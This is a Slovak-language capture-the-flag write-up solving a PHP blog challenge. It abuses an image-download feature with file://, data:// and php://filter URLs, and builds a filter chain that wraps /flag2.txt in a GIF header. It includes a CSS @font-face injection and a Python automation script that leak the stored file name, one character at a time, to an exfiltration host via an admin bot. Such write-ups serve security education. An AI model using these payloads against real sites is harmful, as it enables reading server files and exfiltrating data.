# Zadanie

EN: How far can you get? :)

SK: Kam a≈æ sa vie≈° dosta≈•? :)

## Rie≈°enie

Tu je to trochu n√°roƒçnej≈°ie preto≈æe teraz mus√≠me vydolova≈• vlajku, ktor√° sa nach√°dza v s√∫borovom syst√©me..

Z admin-bot puppeteer javascriptu vid√≠me, ≈æe pokiaƒæ existuje tlaƒçidlo na spracovanie obr√°zku, tak na≈à klikne a potvrd√≠.

```js
const processImagesButton = await page.$(".process-images-btn");
    if (processImagesButton) {
      await page.click(".process-images-btn");
      console.log(`Clicked process images button on: ${url}`);
      await page.waitForSelector(".flash-confirm-yes", {
        timeout: 500,
      });
      await page.click(".flash-confirm-yes");
      console.log(`Flash confirmation clicked found on: ${url}`);
    }
```

Je d√¥le≈æit√© poznamena≈•, ≈æe tlaƒçidlo je viditeƒæn√© len vtedy, pokiaƒæ backet samotn√Ω natrafil na "platn√Ω" obr√°zok.

Po vytvoren√≠ pr√≠spevku sa over√≠, ƒçi pr√≠spevok obsahuje extern√© obr√°zky

```php
<?php 
$hasExternalImages = $blogPost->hasExternalImages($postId);
if ($hasExternalImages): ?>
    <button onclick="processImages(this.getAttribute('postid'))" postid="<?= $post['id'] ?>" class="btn process-images-btn" style="background: #fd7e14; color: white; margin-right: 0.5rem;">
        Process External Images
    </button>
<?php endif; ?> 


a v BlogPost.php
<?php
...
public function hasExternalImages($postId) {
    $query = "SELECT content FROM posts WHERE id = ?";
    $stmt = $this->db->prepare($query);
    $stmt->execute([$postId]);
    $post = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$post) {
        return false;
    }

    // Only check if content starts with <img src= (thumbnail support only)
    if (!preg_match('/^\s*<img\s+src=/i', trim($post['content']))) {
        return false;
    }

    // Check if the first image has external URL
    $pattern = '/^\s*<img\s+[^>]*src="(\w+:\/\/[^"]+)"/i';
    return preg_match($pattern, trim($post['content'])) === 1;
}
...
?>
```

Tak≈æe pr√≠spevok mus√≠ obsahova≈• string `<img src=nieco://nieco`, aby sa zjavilo schvaƒæovacie tlaƒçidlo...

Keƒè na≈à admin klikne, tak sa zavol√° PUT request na `api/process-images.php` s telom id pr√≠spevku, na z√°klade ktor√©ho si backend naƒç√≠ta objekt BlogPost a jeho content spracov√°va volan√≠m tohto

```php
$processedContent = $blogPost->getProcessedContentPreview($post['content']);
```

ktor√© zavol√°

```php
public function getProcessedContentPreview($content) {
        return $this->processImages($content, true);
    }
```

a to rob√≠ toto

```php
private function processImages($content, $isTemporary = false) {
    // Only process if content starts with <img src=
    // We only support a single thumbnail image at the beginning of posts
    // This creates a nicer, more consistent format for the blog
    if (!preg_match('/^\s*<img\s+src=/i', trim($content))) {
        return $content;
    }

    // Find the first image URL and replace with hosted version
    $pattern = '/^(\s*<img\s+[^>]*src=")(\w+:\/\/[^"]+)("[^>]*>)/i';
    return preg_replace_callback($pattern, function($matches) use ($isTemporary) {
        try {
            $hostedFilename = $this->imageManager->downloadAndStore($matches[2], $isTemporary);
            return $matches[1] . 'uploads/' . $hostedFilename . $matches[3];
        } catch (Exception $e) {
            return $matches[0]; // Keep original if download fails
        }
    }, $content, 1); // Limit to 1 replacement
}
```

ƒço vlastne n√°jde prv√Ω v√Ωskyt `<img src=` a ƒço je za t√Ωm spracuje cez 

```php
$hostedFilename = $this->imageManager->downloadAndStore($matches[2], $isTemporary);
```

a ak v≈°etko prejde, ulo≈æ√≠ spracovan√Ω obr√°zok do `uploads/` alebo ak pre≈°iel len kontrolou, ale e≈°te nie je schv√°len√Ω, tak do `uploads/temp/`.

Kontrola na serveri je nasledovn√°

```php
public function downloadAndStore($imageUrl, $isTemporary) {
    if ($isTemporary) {
        $tempUploadDir = $this->uploadDir . 'temp/';
        if (!is_dir($tempUploadDir)) {
            mkdir($tempUploadDir, 0755, true);
        }
    }

    // Validate URL
    if (!filter_var($imageUrl, FILTER_VALIDATE_URL)) {
        throw new Exception('Invalid URL');
    }

    // Download image
    $imageData = file_get_contents($imageUrl);
    if ($imageData === false) {
        throw new Exception('Failed to download image');
    }

    // Check file size
    if (strlen($imageData) < 1 || strlen($imageData) > 1048576) {
        throw new Exception('Image size must be between 1 byte and 1MB');
    }

    // Get file extension
    $imageInfo = getimagesizefromstring($imageData);
    if ($imageInfo === false) {
        throw new Exception('Invalid image format');
    }

    $extension = match($imageInfo['mime']) {
        'image/jpeg' => 'jpg',
        'image/png' => 'png',
        'image/gif' => 'gif',
        'image/webp' => 'webp',
        default => 'img', // there are other formats, but we will use a generic extension because there's so many of them
    };



    $hash = md5($imageData);
    $filename = $hash . '.' . $extension;


    $filepath = $isTemporary ? $tempUploadDir . $filename : $this->uploadDir . $filename;

    // Save file
    file_put_contents($filepath, $imageData);

    $prefix = $isTemporary ? 'temp/' : '';

    return $prefix . $hash . '.' . $extension;
}
```

1. validuje url (tu prejde data://, file://, php://filter, http://, ...)

2. naƒç√≠ta obsah obr√°zka z url

3. zist√≠ veƒækos≈• naƒç√≠tan√Ωch d√°t

4. zist√≠ typ s√∫boru `$imageInfo = getimagesizefromstring($imageData);`

5. ak sa to podar√≠, tak urƒç√≠ pr√≠ponu s√∫boru na z√°klade typu

6. z obsahu vyrob√≠ hash

7. pomenuje `hash . zisten√° pr√≠pona`

8. urƒç√≠ kam sa ulo≈æ√≠

9. ulo≈æ√≠

10. vr√°ti adresu kam sa ulo≈æil (ak nebol validn√Ω obr√°zok, tak fallback na origin√°lny source)

Keƒè≈æe √∫loha sama napoved√°, ≈æe ide o nieƒço z obr√°zkom, tak potrebujem vlo≈æi≈• url s tak√Ωm obsahom, aby ho backend validoval ako obr√°zok, a nejako mus√≠me inflitrova≈• vlajku do s√∫boru, s t√Ωm obr√°zkom...

Vyrobil som si logovanie, prihl√°sil sa ako admin a sk√∫sil spracova≈• obr√°zok

```log
Processing content: 
===========================
<img src="file:///flag2.txt">
===========================
matches[2] = file:///flag2.txt
downloadAndStore started
imageUrl = file:///flag2.txt
Downloading image from file:///flag2.txt
imageData = SK-CERT{flag2_for_testing}
Image size: 26 bytes
imageInfo = 
Invalid image format
Error downloading image: Invalid image format
return <img src="file:///flag2.txt">
```

`file://` teda funguje.. sk√∫sim data

```log
Processing content: 
===========================
<img src="data://image/gif;base64,R0lGODlhyADIAPIFAP">
===========================
matches[2] = data://image/gif;base64,R0lGODlhyADIAPIFAP
downloadAndStore started
imageUrl = data://image/gif;base64,R0lGODlhyADIAPIFAP
Downloading image from data://image/gif;base64,R0lGODlhyADIAPIFAP
imageData = GIF89a»†»†ÚÖ†äImage size: 13 bytes
imageInfo = Array
(
    [0] => 200
    [1] => 200
    [2] => 1
    [3] => width="200" height="200"
    [bits] => 3
    [channels] => 3
    [mime] => image/gif
)

extension = gif
hash = 8f880017c7773f16e2b41a05ea1d9530
filename = 8f880017c7773f16e2b41a05ea1d9530.gif
filepath = /var/www/html/classes/../uploads/temp/8f880017c7773f16e2b41a05ea1d9530.gif
Returning path: temp/8f880017c7773f16e2b41a05ea1d9530.gif
hostedFilename = temp/8f880017c7773f16e2b41a05ea1d9530.gif
return = <img src=" . 'uploads/' . temp/8f880017c7773f16e2b41a05ea1d9530.gif . ">;
```

Tu to dokonca aj validovalo... e≈°te otestujem php://filter

```log
Processing content: 
===========================
<img src="php://filter/read=convert.base64-encode/resource=/flag2.txt">
===========================
matches[2] = php://filter/read=convert.base64-encode/resource=/flag2.txt
downloadAndStore started
imageUrl = php://filter/read=convert.base64-encode/resource=/flag2.txt
Downloading image from php://filter/read=convert.base64-encode/resource=/flag2.txt
imageData = U0stQ0VSVHtpX2wwdjNfZjFsdDNyNV80bmRfNTBfZDAzc19waHB9
Image size: 52 bytes
imageInfo = 
Invalid image format
Error downloading image: Invalid image format
return <img src="php://filter/read=convert.base64-encode/resource=/flag2.txt">
```

Hm, toto vyzer√° n√°dejde a po dopyte chatgpt ƒçi dok√°≈æem do val√≠dne vyzeraj√∫ceho GIF infiltrova≈• obsah vlajky som dostal odkaz na tento git repozit√°r https://github.com/synacktiv/php_filter_chain_generator

Zadal som pr√≠kaz `python php_filter_chain_generator.py --chain "GIF89a"` a vygenerovalo mi toto

> php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

php://temp zmen√≠m na /flag2.txt a vysk√∫≈°am lok√°lne (na lok√°lne som medziƒçasom vymenil vlajku za re√°lne, ale PoC sed√≠)

Log mi dal toto

```log
Processing content: 
===========================
<img src="php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/flag2.txt">
===========================
matches[2] = php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/flag2.txt
downloadAndStore started
imageUrl = php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/flag2.txt
Downloading image from php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/flag2.txt
imageData = GIF89a$)CSK-CERT{i_l0v3_f1lt3r5_4nd_50_d03s_php}¬Ä@C√ê–∏ ÔøΩÔøΩ = =¬Ä@C√ê–∏ ÔøΩÔøΩ = =¬Ä@
Image size: 96 bytes
imageInfo = Array
(
    [0] => 9243
    [1] => 17193
    [2] => 1
    [3] => width="9243" height="17193"
    [channels] => 3
    [mime] => image/gif
)

extension = gif
hash = ceabd9a3ca77eb8bdb82ded8354d16d8
filename = ceabd9a3ca77eb8bdb82ded8354d16d8.gif
filepath = /var/www/html/classes/../uploads/temp/ceabd9a3ca77eb8bdb82ded8354d16d8.gif
Returning path: temp/ceabd9a3ca77eb8bdb82ded8354d16d8.gif
hostedFilename = temp/ceabd9a3ca77eb8bdb82ded8354d16d8.gif
return = <img src=" . 'uploads/' . temp/ceabd9a3ca77eb8bdb82ded8354d16d8.gif . ">;
```

Image validovalo a ako obsah obsahuje vlajku... Tu s√≠ce vid√≠m md5 meno, ale k dispoz√≠cii na lok√°lne testovanie m√°me in√∫ vlajku, tak≈æe n√°zov s√∫boru re√°lne e≈°te nepozn√°me... ako ale exfiltrova≈• n√°zov?

Keƒè testujem ako admin, vid√≠m, ≈æe str√°nka vygenerovala pre content tak√©to html

```html
<div class="post-content" style="font-size: 1.1rem; line-height: 1.8;" id="post-content">
<img src="uploads/temp/ceabd9a3ca77eb8bdb82ded8354d16d8.gif">
</div>
```

Ak by sme vlo≈æili style a cez css siblinga aplikovali pravidlo na zaklade ineho atrob√∫tu, mohlo by to fungova≈•. Samozrejme do png prid√°me class atrib√∫t

Ked zad√°m do pr√≠spevku

```
<img src="php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=file:///flag2.txt" class="payloadspan">
<span class="payloadspan">Give the name: uploads/temp/</span>
<svg>
<style>
@font-face{font-family:'uploads/temp/0';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/0')}
.payloadspan[src^='uploads/temp/0'] + .payloadspan{font-family:'uploads/temp/0'!important}

@font-face{font-family:'uploads/temp/1';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/1')}
.payloadspan[src^='uploads/temp/1'] + .payloadspan{font-family:'uploads/temp/1'!important}

@font-face{font-family:'uploads/temp/2';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/2')}
.payloadspan[src^='uploads/temp/2'] + .payloadspan{font-family:'uploads/temp/2'!important}

@font-face{font-family:'uploads/temp/3';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/3')}
.payloadspan[src^='uploads/temp/3'] + .payloadspan{font-family:'uploads/temp/3'!important}

@font-face{font-family:'uploads/temp/4';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/4')}
.payloadspan[src^='uploads/temp/4'] + .payloadspan{font-family:'uploads/temp/4'!important}

@font-face{font-family:'uploads/temp/5';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/5')}
.payloadspan[src^='uploads/temp/5'] + .payloadspan{font-family:'uploads/temp/5'!important}

@font-face{font-family:'uploads/temp/6';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/6')}
.payloadspan[src^='uploads/temp/6'] + .payloadspan{font-family:'uploads/temp/6'!important}

@font-face{font-family:'uploads/temp/7';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/7')}
.payloadspan[src^='uploads/temp/7'] + .payloadspan{font-family:'uploads/temp/7'!important}

@font-face{font-family:'uploads/temp/8';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/8')}
.payloadspan[src^='uploads/temp/8'] + .payloadspan{font-family:'uploads/temp/8'!important}

@font-face{font-family:'uploads/temp/9';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/9')}
.payloadspan[src^='uploads/temp/9'] + .payloadspan{font-family:'uploads/temp/9'!important}

@font-face{font-family:'uploads/temp/a';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/a')}
.payloadspan[src^='uploads/temp/a'] + .payloadspan{font-family:'uploads/temp/a'!important}

@font-face{font-family:'uploads/temp/b';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/b')}
.payloadspan[src^='uploads/temp/b'] + .payloadspan{font-family:'uploads/temp/b'!important}

@font-face{font-family:'uploads/temp/c';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/c')}
.payloadspan[src^='uploads/temp/c'] + .payloadspan{font-family:'uploads/temp/c'!important}

@font-face{font-family:'uploads/temp/d';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/d')}
.payloadspan[src^='uploads/temp/d'] + .payloadspan{font-family:'uploads/temp/d'!important}

@font-face{font-family:'uploads/temp/e';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/e')}
.payloadspan[src^='uploads/temp/e'] + .payloadspan{font-family:'uploads/temp/e'!important}

@font-face{font-family:'uploads/temp/f';src:url('http://exfiltration:8000/tvojewriteupid/?name=uploads/temp/f')}
.payloadspan[src^='uploads/temp/f'] + .payloadspan{font-family:'uploads/temp/f'!important}


</style>
</svg>
```

Tak mi hitne reqbin preto≈æe adminovi sa po spracovani url obrazku zmeni na realne http url s odkazom na temporary obrazok a takto opa≈• p√≠smenko po p√≠smenku z√≠skam to ƒço potrebujem - md5 meno s√∫boru...

Automat je tak√Ωto

```python
#!/usr/bin/env python3
"""
Auto-leaker ‚Äì image-adjacent font trick (fixed)
================================================
‚Ä¢ Ka≈æd√Ω pokus vygeneruje vlastn√© @font-face s **unik√°tnym** n√°zvom.
‚Ä¢ <img class="payload-image"> m√° ako **src aktu√°lny prefix**, tak≈æe selektor `[src^=...]` skutoƒçne matchuje.
"""

import requests
import string
import sys
import time
from urllib.parse import urljoin, quote_plus

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  NASTAVENIA  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
BASE_URL_APP  = "http://exp.cybergame.sk:7020/"
VISIT_URL     = "http://exp.cybergame.sk:7021/visit"
WEBHOOK_ID    = "tvojereqbinid" 
COOKIE_HEADER = "PHPSESSID=xxx;"

WEBHOOK_BASE  = f"http://exfiltration:8000/{WEBHOOK_ID}"
IMAGE_CHARSET = "0123456789abcdef"
START_PREFIX  = "uploads/temp/"

sess = requests.Session()
sess.headers.update({
    "User-Agent": "Mozilla/5.0 (font-leaker)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": COOKIE_HEADER,
})

imgsrc = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=file:///flag2.txt"
def img_payload(prefix: str) -> str:
    css_rules = []

    for ch in IMAGE_CHARSET:
        guess = prefix + ch
        font_name = f"{guess}"
        font_url  = f"{WEBHOOK_BASE}/?name={guess}"
        css_rules += [
            f"@font-face{{font-family:'{font_name}';src:url('{font_url}')}}\n",
            f".payloadspan[src^='{guess}'] + .payloadspan{{font-family:'{font_name}'!important}}\n\n",
        ]
    return (
        f'<img src="{imgsrc}" class="payloadspan">\n'
        f'<span class="payloadspan">Give the name: {prefix}</span>\n'
        "<svg>\n<style>\n" + "".join(css_rules) + "\n</style>\n</svg>"
        "\n"
    )


def new_post(html: str) -> str:
    r = sess.post(urljoin(BASE_URL_APP, "create.php"),
                  data={"title": "font-probe", "content": html},
                  allow_redirects=False)
    if r.status_code != 302 or "Location" not in r.headers:
        raise RuntimeError("create.php failed")
    return urljoin(BASE_URL_APP, r.headers["Location"])


def notify_admin(url: str) -> None:
    r = sess.post(VISIT_URL, data={"url": url})
    if r.status_code != 200:
        raise RuntimeError("/visit failed")

try:
    prefix = START_PREFIX
    while True:
        print(f"\n=== sk√∫≈°am prefix: {prefix}")
        payload = img_payload(prefix)
        print(payload)
        post_url = new_post(payload)
        post_url = post_url.replace("http://exp.cybergame.sk:7020/", "http://web/")
        print("  ‚Ä¢ post:", post_url)
        notify_admin(post_url)
        print("  ‚Ä¢ ƒçakaj na hit ‚Üí", f"{WEBHOOK_BASE}/{prefix}<X>?v=‚Ä¶")

        ch = input("  ‚Ä¢ ƒèal≈°√≠ hex znak > ").strip()
        if len(ch) != 1 or ch not in IMAGE_CHARSET:
            print("    ‚ö† daj 1 hex znak (0-f)")
            continue

        prefix += ch
        time.sleep(0.4)

except (KeyboardInterrupt, EOFError):
    print("\n[ukonƒçen√©]")
except Exception as e:
    print("‚úñ", e, file=sys.stderr)
    sys.exit(1)
```

keƒè prestane chodi≈• na reqbin po 16 znakoch niƒç, znamen√° to, ≈æe m√°me cel√Ω n√°zov..

Posledn√Ω hit bol `?name=uploads/temp/ceabd9a3ca77eb8bdb82ded8354d16d8` n√°zov s√∫boru z testovanie vieme , ≈æe m√° pr√≠ponu gif, tak≈æe cel√Ω n√°zov je `ceabd9a3ca77eb8bdb82ded8354d16d8.gif`

